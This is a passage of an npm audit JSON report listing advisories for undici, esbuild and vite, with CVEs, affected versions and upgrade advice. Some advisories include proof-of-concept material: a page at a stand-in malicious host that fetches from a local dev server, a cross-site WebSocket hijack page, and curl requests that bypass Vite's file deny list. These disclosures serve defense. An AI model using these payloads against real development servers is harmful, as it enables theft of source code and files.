      "overview": "### Impact\n\n[Undici `fetch()` uses Math.random()](https://github.com/nodejs/undici/blob/8b06b8250907d92fead664b3368f1d2aa27c1f35/lib/web/fetch/body.js#L113) to choose the boundary for a multipart/form-data request. It is known that the output of Math.random() can be predicted if several of its generated values are known.\n\nIf there is a mechanism in an app that sends multipart requests to an attacker-controlled website, they can use this to leak the necessary values. Therefore, An attacker can tamper with the requests going to the backend APIs if certain conditions are met.\n\n### Patches\n\nThis is fixed in 5.28.5; 6.21.1; 7.2.3.\n\n### Workarounds\n\nDo not issue multipart requests to attacker controlled servers.\n\n### References\n\n* https://hackerone.com/reports/2913312\n* https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f\n",
      "reported_by": null,
      "title": "Use of Insufficiently Random Values in undici",
      "metadata": null,
      "cves": [
        "CVE-2025-22150"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "undici",
      "vulnerable_versions": ">=4.5.0 <5.28.5",
      "github_advisory_id": "GHSA-c76h-2ccp-4975",
      "recommendation": "Upgrade to version 5.28.5 or later",
      "patched_versions": ">=5.28.5",
      "updated": "2025-01-22T08:01:28.000Z",
      "cvss": {
        "score": 6.8,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N"
      },
      "cwe": [
        "CWE-330"
      ],
      "url": "https://github.com/advisories/GHSA-c76h-2ccp-4975"
    },
    "1102341": {
      "findings": [
        {
          "version": "0.19.12",
          "paths": [
            "packages__ui>vite>esbuild"
          ]
        },
        {
          "version": "0.18.20",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite>esbuild"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
      "created": "2025-02-10T17:48:07.000Z",
      "id": 1102341,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
      "reported_by": null,
      "title": "esbuild enables any website to send any requests to the development server and read the response",
      "metadata": null,
      "cves": [],
      "access": "public",
      "severity": "moderate",
      "module_name": "esbuild",
      "vulnerable_versions": "<=0.24.2",
      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
      "recommendation": "Upgrade to version 0.25.0 or later",
      "patched_versions": ">=0.25.0",
      "updated": "2025-02-10T17:48:08.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-346"
      ],
      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
    },
    "1102436": {
      "findings": [
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6\n- https://nvd.nist.gov/vuln/detail/CVE-2025-24010\n- https://github.com/advisories/GHSA-vg6x-rcgg-rjx6",
      "created": "2025-01-21T19:52:55.000Z",
      "id": 1102436,
      "npm_advisory_id": null,
      "overview": "### Summary\nVite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.\n\n> [!WARNING]\n> This vulnerability even applies to users that only run the Vite dev server on the local machine and does not expose the dev server to the network.\n\n### Upgrade Path\nUsers that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.\n\n- Using the backend integration feature\n- Using a reverse proxy in front of Vite\n- Accessing the development server via a domain other than `localhost` or `*.localhost`\n- Using a plugin / framework that connects to the WebSocket server on their own from the browser\n\n#### Using the backend integration feature\nIf you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.\n\n#### Using a reverse proxy in front of Vite\nIf you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option.\n\n#### Accessing the development server via a domain other than `localhost` or `*.localhost`\nYou need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.\n\n#### Using a plugin / framework that connects to the WebSocket server on their own from the browser\nIf you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.\n\nIn that case, you can either:\n\n- fix the plugin / framework code to the make it compatible with the new version of Vite\n- set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite\n  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.\n\n### Mitigation without upgrading Vite\n#### [1]: Permissive default CORS settings\nSet `server.cors` to `false` or limit `server.cors.origin` to trusted origins.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\nThere aren't any mitigations for this.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\nUse Chrome 94+ or use HTTPS for the development server.\n\n### Details\n\nThere are three causes that allowed malicious websites to send any requests to the development server:\n\n#### [1]: Permissive default CORS settings\n\nVite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.\n\nAttack scenario:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n2. The user accesses the malicious web page.\n3. The attacker sends a `fetch('http://127.0.0.1:5173/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n4. The attacker gets the content of `http://127.0.0.1:5173/main.js`.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\n\nVite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.\n\nAttack scenario:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n2. The user accesses the malicious web page.\n3. The attacker runs `new WebSocket('http://127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page.\n4. The user edits some files.\n5. Vite sends some HMR messages over WebSocket.\n6. The attacker gets the content of the HMR messages.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\n\nUnless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.\n\n1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won't work).\n2. The user accesses the malicious web page.\n3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).\n4. The attacker sends a `fetch('/main.js')` request by JS in that malicious web page.\n5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy.\n\n### Impact\n#### [1]: Permissive default CORS settings\nUsers with the default `server.cors` option may:\n\n- get the source code stolen by malicious websites\n- give the attacker access to functionalities that are not supposed to be exposed externally\n  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\nAll users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.\n\nFor users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.\n\nFor users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\nUsers using HTTP for the development server and using a browser that is not Chrome 94+ may:\n\n- get the source code stolen by malicious websites\n- give the attacker access to functionalities that are not supposed to be exposed externally\n  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.\n\nChrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94.\n\n### Related Information\nSafari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of \"the malicious web page is served on HTTP\" to make [1] and [2] to work.\n\n### PoC\n#### [2]: Lack of validation on the Origin header for WebSocket connections\n1. I used the `react` template which utilizes HMR functionality.\n\n```\nnpm create vite@latest my-vue-app-react -- --template react\n```\n\n2. Then on a malicious server, serve the following POC html:\n```html\n<!doctype html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"utf-8\" />\n        <title>vite CSWSH</title>\n    </head>\n    <body>\n        <div id=\"logs\"></div>\n        <script>\n            const div = document.querySelectorAll('#logs')[0];\n            const ws = new WebSocket('ws://localhost:5173','vite-hmr');\n            ws.onmessage = event => {\n                const logLine = document.createElement('p');\n                logLine.innerHTML = event.data;\n                div.append(logLine);\n            };\n        </script>\n    </body>\n</html>\n```\n\n3. Kick off Vite \n\n```\nnpm run dev\n```\n\n4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. \n5. Edit `src/App.jsx` file and intentionally place a syntax error\n6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed\n\nHere's a video demonstrating the POC:\n\nhttps://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961",
      "reported_by": null,
      "title": "Websites were able to send any requests to the development server and read the response in vite",
      "metadata": null,
      "cves": [
        "CVE-2025-24010"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": "<=4.5.5",
      "github_advisory_id": "GHSA-vg6x-rcgg-rjx6",
      "recommendation": "Upgrade to version 4.5.6 or later",
      "patched_versions": ">=4.5.6",
      "updated": "2025-02-07T17:39:00.000Z",
      "cvss": {
        "score": 6.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-346",
        "CWE-350",
        "CWE-1385"
      ],
      "url": "https://github.com/advisories/GHSA-vg6x-rcgg-rjx6"
    },
    "1102437": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6\n- https://nvd.nist.gov/vuln/detail/CVE-2025-24010\n- https://github.com/advisories/GHSA-vg6x-rcgg-rjx6",
      "created": "2025-01-21T19:52:55.000Z",
      "id": 1102437,
      "npm_advisory_id": null,
      "overview": "### Summary\nVite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.\n\n> [!WARNING]\n> This vulnerability even applies to users that only run the Vite dev server on the local machine and does not expose the dev server to the network.\n\n### Upgrade Path\nUsers that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.\n\n- Using the backend integration feature\n- Using a reverse proxy in front of Vite\n- Accessing the development server via a domain other than `localhost` or `*.localhost`\n- Using a plugin / framework that connects to the WebSocket server on their own from the browser\n\n#### Using the backend integration feature\nIf you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.\n\n#### Using a reverse proxy in front of Vite\nIf you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option.\n\n#### Accessing the development server via a domain other than `localhost` or `*.localhost`\nYou need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.\n\n#### Using a plugin / framework that connects to the WebSocket server on their own from the browser\nIf you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.\n\nIn that case, you can either:\n\n- fix the plugin / framework code to the make it compatible with the new version of Vite\n- set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite\n  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.\n\n### Mitigation without upgrading Vite\n#### [1]: Permissive default CORS settings\nSet `server.cors` to `false` or limit `server.cors.origin` to trusted origins.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\nThere aren't any mitigations for this.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\nUse Chrome 94+ or use HTTPS for the development server.\n\n### Details\n\nThere are three causes that allowed malicious websites to send any requests to the development server:\n\n#### [1]: Permissive default CORS settings\n\nVite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.\n\nAttack scenario:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n2. The user accesses the malicious web page.\n3. The attacker sends a `fetch('http://127.0.0.1:5173/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n4. The attacker gets the content of `http://127.0.0.1:5173/main.js`.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\n\nVite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.\n\nAttack scenario:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n2. The user accesses the malicious web page.\n3. The attacker runs `new WebSocket('http://127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page.\n4. The user edits some files.\n5. Vite sends some HMR messages over WebSocket.\n6. The attacker gets the content of the HMR messages.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\n\nUnless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.\n\n1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won't work).\n2. The user accesses the malicious web page.\n3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).\n4. The attacker sends a `fetch('/main.js')` request by JS in that malicious web page.\n5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy.\n\n### Impact\n#### [1]: Permissive default CORS settings\nUsers with the default `server.cors` option may:\n\n- get the source code stolen by malicious websites\n- give the attacker access to functionalities that are not supposed to be exposed externally\n  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\nAll users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.\n\nFor users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.\n\nFor users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\nUsers using HTTP for the development server and using a browser that is not Chrome 94+ may:\n\n- get the source code stolen by malicious websites\n- give the attacker access to functionalities that are not supposed to be exposed externally\n  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.\n\nChrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94.\n\n### Related Information\nSafari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of \"the malicious web page is served on HTTP\" to make [1] and [2] to work.\n\n### PoC\n#### [2]: Lack of validation on the Origin header for WebSocket connections\n1. I used the `react` template which utilizes HMR functionality.\n\n```\nnpm create vite@latest my-vue-app-react -- --template react\n```\n\n2. Then on a malicious server, serve the following POC html:\n```html\n<!doctype html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"utf-8\" />\n        <title>vite CSWSH</title>\n    </head>\n    <body>\n        <div id=\"logs\"></div>\n        <script>\n            const div = document.querySelectorAll('#logs')[0];\n            const ws = new WebSocket('ws://localhost:5173','vite-hmr');\n            ws.onmessage = event => {\n                const logLine = document.createElement('p');\n                logLine.innerHTML = event.data;\n                div.append(logLine);\n            };\n        </script>\n    </body>\n</html>\n```\n\n3. Kick off Vite \n\n```\nnpm run dev\n```\n\n4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. \n5. Edit `src/App.jsx` file and intentionally place a syntax error\n6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed\n\nHere's a video demonstrating the POC:\n\nhttps://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961",
      "reported_by": null,
      "title": "Websites were able to send any requests to the development server and read the response in vite",
      "metadata": null,
      "cves": [
        "CVE-2025-24010"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=5.0.0 <=5.4.11",
      "github_advisory_id": "GHSA-vg6x-rcgg-rjx6",
      "recommendation": "Upgrade to version 5.4.12 or later",
      "patched_versions": ">=5.4.12",
      "updated": "2025-02-07T17:39:00.000Z",
      "cvss": {
        "score": 6.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-346",
        "CWE-350",
        "CWE-1385"
      ],
      "url": "https://github.com/advisories/GHSA-vg6x-rcgg-rjx6"
    },
    "1102442": {
      "findings": [
        {
          "version": "5.28.3",
          "paths": [
            "packages__components>@elastic/elasticsearch>@elastic/transport>undici"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-m4v8-wqvr-p9f7\n- https://github.com/nodejs/undici/commit/64e3402da4e032e68de46acb52800c9a06aaea3f\n- https://github.com/nodejs/undici/commit/6805746680d27a5369d7fb67bc05f95a28247d75\n- https://hackerone.com/reports/2408074\n- https://nvd.nist.gov/vuln/detail/CVE-2024-30260\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HQVHWAS6WDXXIU7F72XI55VZ2LTZUB33\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NC3V3HFZ5MOJRZDY5ZELL6REIRSPFROJ\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/P6Q4RGETHVYVHDIQGTJGU5AV6NJEI67E\n- https://github.com/advisories/GHSA-m4v8-wqvr-p9f7",
      "created": "2024-04-04T14:20:39.000Z",
      "id": 1102442,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nUndici cleared Authorization and Proxy-Authorization headers for `fetch()`, but did not clear them for `undici.request()`.\n\n### Patches\n\nThis has been patched in https://github.com/nodejs/undici/commit/6805746680d27a5369d7fb67bc05f95a28247d75.\nFixes has been released in v5.28.4 and v6.11.1.\n\n### Workarounds\n\nuse `fetch()` or disable `maxRedirections`.\n\n### References\n\nLinzi Shang reported this.\n\n* https://hackerone.com/reports/2408074\n* https://github.com/nodejs/undici/security/advisories/GHSA-3787-6prv-h9w3",
      "reported_by": null,
      "title": "Undici's Proxy-Authorization header not cleared on cross-origin redirect for dispatch, request, stream, pipeline",
      "metadata": null,
      "cves": [
        "CVE-2024-30260"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "undici",
      "vulnerable_versions": "<5.28.4",
      "github_advisory_id": "GHSA-m4v8-wqvr-p9f7",
      "recommendation": "Upgrade to version 5.28.4 or later",
      "patched_versions": ">=5.28.4",
      "updated": "2025-02-13T19:02:16.000Z",
      "cvss": {
        "score": 3.9,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:L"
      },
      "cwe": [
        "CWE-200",
        "CWE-285",
        "CWE-863"
      ],
      "url": "https://github.com/advisories/GHSA-m4v8-wqvr-p9f7"
    },
    "1103516": {
      "findings": [
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w\n- https://nvd.nist.gov/vuln/detail/CVE-2025-30208\n- https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4\n- https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c\n- https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41\n- https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca\n- https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1\n- https://github.com/advisories/GHSA-x574-m823-4x7w",
      "created": "2025-03-25T14:00:02.000Z",
      "id": 1103516,
      "npm_advisory_id": null,
      "overview": "### Summary\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\nOnly apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n`@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes.\n\n### PoC\n```bash\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" > /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    <body>\n      <h1>403 Restricted</h1>\n      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n```",
      "reported_by": null,
      "title": "Vite bypasses server.fs.deny when using ?raw??",
      "metadata": null,
      "cves": [
        "CVE-2025-30208"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": "<4.5.10",
      "github_advisory_id": "GHSA-x574-m823-4x7w",
      "recommendation": "Upgrade to version 4.5.10 or later",
      "patched_versions": ">=4.5.10",
      "updated": "2025-03-25T14:00:04.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-x574-m823-4x7w"
    },
    "1103517": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w\n- https://nvd.nist.gov/vuln/detail/CVE-2025-30208\n- https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4\n- https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c\n- https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41\n- https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca\n- https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1\n- https://github.com/advisories/GHSA-x574-m823-4x7w",
      "created": "2025-03-25T14:00:02.000Z",
      "id": 1103517,
      "npm_advisory_id": null,
      "overview": "### Summary\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\nOnly apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n`@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes.\n\n### PoC\n```bash\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" > /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    <body>\n      <h1>403 Restricted</h1>\n      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n```",
      "reported_by": null,
      "title": "Vite bypasses server.fs.deny when using ?raw??",
      "metadata": null,
      "cves": [
        "CVE-2025-30208"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=5.0.0 <5.4.15",
      "github_advisory_id": "GHSA-x574-m823-4x7w",
      "recommendation": "Upgrade to version 5.4.15 or later",
      "patched_versions": ">=5.4.15",
      "updated": "2025-03-25T14:00:04.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-x574-m823-4x7w"
    },
    "1103627": {
      "findings": [
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8\n- https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949\n- https://nvd.nist.gov/vuln/detail/CVE-2025-31125\n- https://github.com/advisories/GHSA-4r4m-qw57-chr8",
      "created": "2025-03-31T17:31:54.000Z",
      "id": 1103627,
      "npm_advisory_id": null,
